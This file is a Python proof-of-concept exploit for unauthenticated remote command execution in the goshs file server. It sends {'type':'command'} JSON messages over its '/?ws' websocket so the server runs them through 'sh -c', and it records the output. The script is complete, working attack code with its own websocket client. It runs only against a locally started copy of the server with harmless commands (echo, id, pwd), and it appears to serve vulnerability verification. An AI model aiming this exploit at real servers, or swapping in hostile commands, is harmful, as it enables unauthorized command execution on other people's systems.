#!/usr/bin/env python3
"""PoC: unauthenticated remote command execution via the goshs websocket channel.

goshs exposes a browser-sync websocket endpoint at ``/?ws``.  Client messages
are JSON objects of the form ``{"type": ..., "content": ...}``.  Besides the
clipboard-related message types the server also accepts ``{"type": "command",
"content": <arbitrary string>}``, which it hands to ``cli.RunCMD`` -- a
``sh -c`` invocation on unix (``cli/cli_unix.go``) -- and broadcasts the
resulting process output back to every connected websocket client as
``{"type":"updateCLI","content": <combined stdout/stderr>}``.

This script starts the target binary on 127.0.0.1 with a fresh temporary
webroot, performs the RFC6455 upgrade against ``/?ws`` and sends commands that
are constructed entirely at run time (a random marker plus commands reporting
the server-side uid/gid/cwd), then records the server's broadcasts as a
complete ``C>`` / ``S<`` protocol transcript.

Standard library only.
"""

import argparse
import base64
import hashlib
import json
import os
import shutil
import socket
import string
import struct
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

HOST = "127.0.0.1"
# A dead loopback proxy makes goshs' startup update check fail instantly
# instead of hanging on a network timeout.
DEAD_PROXY = "http://127.0.0.1:9"
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

MAX_STDOUT_CHARS = 20000
MAX_STDERR_CHARS = 20000
RESPONSE_WINDOW = 3.0  # seconds to listen for broadcasts after each send
SETTLE_DELAY = 0.3  # seconds between messages
FINAL_DRAIN = 1.5  # seconds to listen after the last message


class ScriptError(Exception):
    """Script-level execution failure (never a missing server response)."""


# --------------------------------------------------------------------------
# Minimal RFC6455 client (client-to-server frames must be masked)
# --------------------------------------------------------------------------
class WebSocketClient(object):
    def __init__(self, host, port, resource="/?ws", timeout=10.0):
        self.host = host
        self.port = port
        self.resource = resource
        self.timeout = timeout
        self.sock = None
        self._buf = bytearray()
        self._close_received = False

    def connect(self):
        try:
            self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        except OSError as exc:
            raise ScriptError("could not connect to websocket endpoint: %s" % exc)
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n" % (self.resource, self.host, self.port, key)
        )
        try:
            self.sock.sendall(request.encode("ascii"))
            status_line, headers = self._read_http_head()
        except OSError as exc:
            raise ScriptError("websocket handshake transport error: %s" % exc)

        if not status_line.endswith(b" 101") and b" 101 " not in status_line:
            raise ScriptError(
                "websocket upgrade failed: %s" % status_line.decode("latin-1").strip()
            )
        expected = base64.b64encode(
            hashlib.sha1((key + WS_GUID).encode("ascii")).digest()
        ).decode("ascii")
        accept = None
        for name, value in headers:
            if name.lower() == "sec-websocket-accept":
                accept = value
        if accept != expected:
            raise ScriptError(
                "websocket handshake rejected: bad Sec-WebSocket-Accept (%r)" % accept
            )

    def _read_http_head(self):
        while b"\r\n\r\n" not in self._buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ScriptError(
                    "connection closed during websocket handshake: %r" % bytes(self._buf)
                )
            self._buf.extend(chunk)
        head, _, rest = bytes(self._buf).partition(b"\r\n\r\n")
        self._buf = bytearray(rest)
        lines = head.split(b"\r\n")
        status_line = lines[0]
        headers = []
        for line in lines[1:]:
            if b":" in line:
                name, _, value = line.partition(b":")
                headers.append(
                    (name.decode("latin-1").strip(), value.decode("latin-1").strip())
                )
        return status_line, headers

    def _fill(self, deadline):
        """Read more bytes into the buffer; raises socket.timeout past deadline."""
        remaining = deadline - time.time()
        if remaining <= 0:
            raise socket.timeout()
        self.sock.settimeout(remaining)
        chunk = self.sock.recv(65536)
        if not chunk:
            raise EOFError("connection closed by server")
        self._buf.extend(chunk)

    def _read_exact(self, n, deadline):
        while len(self._buf) < n:
            self._fill(deadline)

    def send_text(self, text):
        payload = text.encode("utf-8")
        mask = os.urandom(4)
        header = bytearray([0x81])  # FIN + text opcode
        n = len(payload)
        if n < 126:
            header.append(0x80 | n)
        elif n < 65536:
            header.append(0x80 | 126)
            header.extend(struct.pack(">H", n))
        else:
            header.append(0x80 | 127)
            header.extend(struct.pack(">Q", n))
        header.extend(mask)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + masked)

    def recv_frame(self, timeout):
        """Receive one data frame; pings are answered, close raises EOFError."""
        deadline = time.time() + timeout
        while True:
            self._read_exact(2, deadline)
            b1, b2 = self._buf[0], self._buf[1]
            opcode = b1 & 0x0F
            length = b2 & 0x7F
            offset = 2
            if length == 126:
                self._read_exact(4, deadline)
                length = struct.unpack(">H", bytes(self._buf[2:4]))[0]
                offset = 4
            elif length == 127:
                self._read_exact(10, deadline)
                length = struct.unpack(">Q", bytes(self._buf[2:10]))[0]
                offset = 10
            if b2 >> 7:
                self._read_exact(offset + 4, deadline)
                mask = bytes(self._buf[offset:offset + 4])
                offset += 4
            else:
                mask = None
            if length > 8 * 1024 * 1024:
                raise ScriptError("server sent an oversized websocket frame")
            self._read_exact(offset + length, deadline)
            payload = bytes(self._buf[offset:offset + length])
            del self._buf[: offset + length]
            if mask is not None:
                payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            if opcode == 0x8:  # close
                self._close_received = True
                try:
                    self._send_control(0x8, payload[:2])
                except OSError:
                    pass
                raise EOFError("websocket closed by server")
            if opcode == 0x9:  # ping -> pong
                self._send_control(0xA, payload)
                continue
            if opcode == 0xA:  # pong
                continue
            return opcode, payload

    def _send_control(self, opcode, payload):
        mask = os.urandom(4)
        frame = bytearray([0x80 | opcode, 0x80 | len(payload)])
        frame.extend(mask)
        frame.extend(bytes(b ^ mask[i % 4] for i, b in enumerate(payload)))
        self.sock.sendall(bytes(frame))

    def close(self):
        if self.sock is not None:
            try:
                if not self._close_received:
                    self._send_control(0x8, b"")
            except OSError:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None


# --------------------------------------------------------------------------
# Server lifecycle helpers
# --------------------------------------------------------------------------
def free_port():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, 0))
    port = sock.getsockname()[1]
    sock.close()
    return port


def wait_for_http(port, timeout):
    """Poll the plain HTTP endpoint until the server answers."""
    url = "http://%s:%d/" % (HOST, port)
    deadline = time.time() + timeout
    last_error = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(url, timeout=2) as response:
                response.read(64)
                return
        except urllib.error.HTTPError:
            return  # any HTTP status means the listener is up
        except Exception as exc:  # noqa: BLE001 - keep polling until deadline
            last_error = exc
            time.sleep(0.15)
    raise ScriptError(
        "http endpoint never became ready on port %d (%s)" % (port, last_error)
    )


class Server(object):
    def __init__(self, binary, port, webroot):
        self.binary = binary
        self.port = port
        self.webroot = webroot
        self.command = [binary, "-i", HOST, "-p", str(port), "-d", webroot]
        self.proc = None
        self.stdout_text = ""
        self.stderr_text = ""

    def start(self):
        env = dict(os.environ)
        env["HTTP_PROXY"] = DEAD_PROXY
        env["HTTPS_PROXY"] = DEAD_PROXY
        # Proxy discovery is case-insensitive in Go; remove lowercase variants
        # so the dead proxy above is the one that is honoured.
        env.pop("http_proxy", None)
        env.pop("https_proxy", None)
        try:
            self.proc = subprocess.Popen(
                self.command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                env=env,
                # The webroot is the natural working directory for the server;
                # running the child there keeps the spawned shell's cwd inside
                # the temporary webroot instead of this script's cwd.
                cwd=self.webroot,
                # Never leak this script's fds into the server process: goshs
                # runs client-supplied commands, and an inherited pipe could be
                # written to by them.
                close_fds=True,
            )
        except OSError as exc:
            raise ScriptError("could not start target binary: %s" % exc)

    def stop(self):
        if self.proc is None:
            return
        if self.proc.poll() is None:
            try:
                self.proc.terminate()
            except OSError:
                pass
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    self.proc.kill()
                except OSError:
                    pass
                try:
                    self.proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    pass
        try:
            out, err = self.proc.communicate(timeout=5)
        except Exception:  # noqa: BLE001 - best effort pipe drain
            out, err = b"", b""
        self.stdout_text = (out or b"").decode("utf-8", "replace")
        self.stderr_text = (err or b"").decode("utf-8", "replace")

    def returncode(self):
        if self.proc is None:
            return None
        return self.proc.returncode


# --------------------------------------------------------------------------
# Trigger messages, constructed at run time
# --------------------------------------------------------------------------
def build_messages():
    """Build the websocket messages for this run.

    Every message is assembled here from run-time values: a freshly generated
    random marker and commands whose output can only exist if the server
    executed the string through a server-side shell.  Nothing is read from a
    prebuilt payload on disk.
    """
    alphabet = string.ascii_letters + string.digits
    marker = "GOSHS_POC_" + "".join(
        chr(ord("a") + (ord(os.urandom(1)) % 26)) for _ in range(12)
    )
    trigger = "echo %s; id -u; id -g; pwd" % marker
    messages = [
        json.dumps({"type": "command", "content": trigger}),
        json.dumps({"type": "command", "content": "echo %s" % marker}),
    ]
    return messages


# --------------------------------------------------------------------------
# Main run
# --------------------------------------------------------------------------
def run(binary, timeout):
    started = time.time()
    binary = os.path.abspath(binary)
    if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
        raise ScriptError("target binary not found or not executable: %s" % binary)

    webroot = tempfile.mkdtemp(prefix="goshs_poc_")
    server = None
    transcript = []
    error = None

    try:
        port = free_port()
        server = Server(binary, port, webroot)
        server.start()
        wait_for_http(port, timeout)

        client = WebSocketClient(HOST, port, "/?ws", timeout=10.0)
        client.connect()
        try:
            for index, message in enumerate(build_messages()):
                client.send_text(message)
                transcript.append("C> %s" % message)
                # Bounded window for broadcasts caused by this message.
                window_end = time.time() + RESPONSE_WINDOW
                while True:
                    remaining = window_end - time.time()
                    if remaining <= 0:
                        break
                    try:
                        _, payload = client.recv_frame(timeout=remaining)
                    except (socket.timeout, EOFError):
                        break
                    transcript.append("S< %s" % payload.decode("utf-8", "replace"))
                if index == 0:
                    time.sleep(SETTLE_DELAY)
            # Final drain catches any late broadcasts.
            final_end = time.time() + FINAL_DRAIN
            while True:
                remaining = final_end - time.time()
                if remaining <= 0:
                    break
                try:
                    _, payload = client.recv_frame(timeout=remaining)
                except (socket.timeout, EOFError):
                    break
                transcript.append("S< %s" % payload.decode("utf-8", "replace"))
        finally:
            client.close()
    except ScriptError as exc:
        error = str(exc)
    except Exception as exc:  # noqa: BLE001 - the script must never traceback
        error = "internal error: %r" % (exc,)
    finally:
        if server is not None:
            server.stop()
        shutil.rmtree(webroot, ignore_errors=True)

    stdout = server.stdout_text if server is not None else ""
    stderr = server.stderr_text if server is not None else ""
    returncode = server.returncode() if server is not None else None
    signal = -returncode if (returncode is not None and returncode < 0) else None

    return {
        "binary": binary,
        "command": server.command if server is not None else [binary],
        "returncode": returncode,
        "signal": signal,
        "timed_out": False,
        "runtime_ms": int((time.time() - started) * 1000),
        "stdout": stdout[:MAX_STDOUT_CHARS],
        "stderr": stderr[:MAX_STDERR_CHARS],
        "observable": {
            "kind": "protocol_transcript",
            "value": "\n".join(transcript),
            "path": None,
        },
        "error": error,
    }


def empty_result(binary, error):
    return {
        "binary": os.path.abspath(binary),
        "command": [os.path.abspath(binary)],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "", "path": None},
        "error": error,
    }


def main(argv=None):
    parser = argparse.ArgumentParser(description="goshs websocket RCE proof of concept")
    parser.add_argument("--binary", required=True, help="path to the goshs binary")
    parser.add_argument("--json-out", default=None, help="write JSON result to a file")
    parser.add_argument("--timeout", type=int, default=25, help="per-run timeout")
    args = parser.parse_args(argv)

    try:
        result = run(args.binary, args.timeout)
    except ScriptError as exc:
        result = empty_result(args.binary, str(exc))
    except Exception as exc:  # noqa: BLE001 - never let the script crash
        result = empty_result(args.binary, "internal error: %r" % (exc,))

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(text)
            handle.write("\n")
    else:
        sys.stdout.write(text + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
